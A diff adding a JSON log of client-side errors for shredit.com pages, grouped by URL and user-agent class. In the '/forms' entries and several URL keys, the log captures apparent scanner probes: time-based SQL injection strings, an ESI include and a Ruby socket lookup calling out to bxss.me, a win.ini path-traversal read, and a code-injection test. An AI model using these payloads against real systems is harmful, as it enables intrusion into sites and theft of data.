@@ -1,0 +1,496 @@
+{
+  "https://www.shredit.com/en-ca": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-ca/service-locations/calgary": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-ca/marketing/document-destruction-one-time-regular": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "mobile:ios:webkit"
+    }
+  ],
+  "https://www.shredit.com/en-ca/service-locations/montreal": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-us": [
+    {
+      "error_source": null,
+      "user_agent": "desktop:mac:webkit"
+    },
+    {
+      "error_source": "https://assets.adobedtm.com/69ddc3de7b21/022e4d026e4d/launch-e21320e8ed46.min.js",
+      "user_agent": "desktop:mac:webkit"
+    },
+    {
+      "error_source": null,
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": null,
+      "user_agent": "desktop:mac:webkit"
+    },
+    {
+      "error_source": null,
+      "user_agent": "desktop:mac:webkit"
+    }
+  ],
+  "https://www.shredit.com/en-us/marketing/shred-it-document-destruction-inline": [
+    {
+      "error_source": null,
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-us/marketing/shred-it-hard-drive-destruction": [
+    {
+      "error_source": null,
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-us/secure-shredding-services/shredding-events": [
+    {
+      "error_source": "https://www.shredit.com/en-us/secure-shredding-services/shredding-events",
+      "user_agent": "desktop:mac:webkit"
+    },
+    {
+      "error_source": "",
+      "user_agent": "desktop:mac:webkit"
+    },
+    {
+      "error_source": "",
+      "user_agent": "desktop:mac:webkit"
+    }
+  ],
+  "https://www.shredit.com/en-ca/resource-centre/info-sheets/what-is-a-certificate-of-destruction-and-how-do-you-obtain-one-": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-ca/marketing/hard-drive": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "mobile:android:blink"
+    }
+  ],
+  "https://www.shredit.com/en-ca/marketing/document-destruction-service": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "nn._initializeBackDrop@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:36:32239",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-us/contact-us": [
+    {
+      "error_source": null,
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": null,
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-us/email/pricing": [
+    {
+      "error_source": "https://www.shredit.com/blocks/form/lib/util.js",
+      "user_agent": "desktop:chromeos:blink"
+    },
+    {
+      "error_source": null,
+      "user_agent": "desktop:chromeos:blink"
+    }
+  ],
+  "https://www.shredit.com/fr-ca/nos-prix-dechiquetage": [
+    {
+      "error_source": "nn._initializeBackDrop@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:36:32239",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/en-us/service-locations/orlando": [
+    {
+      "error_source": null,
+      "user_agent": "mobile:ios:webkit"
+    }
+  ],
+  "https://www.shredit.com/fr-ca": [
+    {
+      "error_source": "HTMLButtonElement.<anonymous>@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:64767",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "Object.handleValueChange@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:6:36784",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "HTMLButtonElement.e@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:8020",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "Object.handleValueChange@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:6:36784",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onInvalid@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165746",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "a._onFocus@https://www.shredit.com/etc.clientlibs/stericycle/clientlibs/clientlib-shred-it-site.lc-46bc25f314541a4735e11109b51608cc-lc.min.js:30:165275",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "response.write(9696458*9882983)",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "c:/windows/win.ini",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "\"+\"A\".concat(70-3).concat(22*4).concat(106).concat(78).concat(116).concat(73)+(require\"socket\"\nSocket.gethostbyname(\"hitbq\"+\"pkzrbfvf64b5e.bxss.me.\")[3].to_s)+\"",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    },
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms%3Cesi:include%20src=%22http://bxss.me/rpb.png%22/%3E": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms'%22": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms0%22XOR(if(now()=sysdate(),sleep(15),0))XOR%22Z": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms-1%20waitfor%20delay%20'0:0:15'%20--": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms'||sleep(27*1000)*nmmiel||'": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms%22&&sleep(27*1000)*sdbsdv&&%22": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms%22||sleep(27*1000)*dxjukz||%22": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/forms'&&sleep(27*1000)*eqgtto&&'": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/formsTvhgxtJb": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/formsvTgU4oik'))%20OR%20988=(SELECT%20988%20FROM%20PG_SLEEP(15))--": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/formseReLLcd9'%20OR%2033=(SELECT%2033%20FROM%20PG_SLEEP(15))--": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/formsUcA0GRnU')%20OR%20391=(SELECT%20391%20FROM%20PG_SLEEP(15))--": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ],
+  "https://www.shredit.com/formsSysSOAsL';%20waitfor%20delay%20'0:0:15'%20--": [
+    {
+      "error_source": "undefined error",
+      "user_agent": "desktop:windows:blink"
+    }
+  ]
+}
